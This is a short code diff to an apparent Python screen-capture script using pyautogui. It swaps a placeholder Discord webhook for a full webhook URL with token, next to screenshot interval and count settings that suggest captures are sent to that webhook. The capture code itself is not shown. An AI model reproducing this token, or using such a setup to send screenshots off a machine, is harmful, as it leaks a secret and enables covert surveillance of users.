@@ -33,7 +33,7 @@ import pyautogui
 
 # ================== CONFIG ==================
 CONFIG_FILE = "config.json"
-DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
+DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1504108072963014798/T6FC93tE6R8KYmeckjzuvsoTe_cdD6s8Acpo0IBgb6OqLvH54_1uBW9UKFdBPAZiAFx6"
 INTERVAL = 20
 SCREENSHOT_INTERVAL = 60
 MAX_SCREENSHOTS = 30
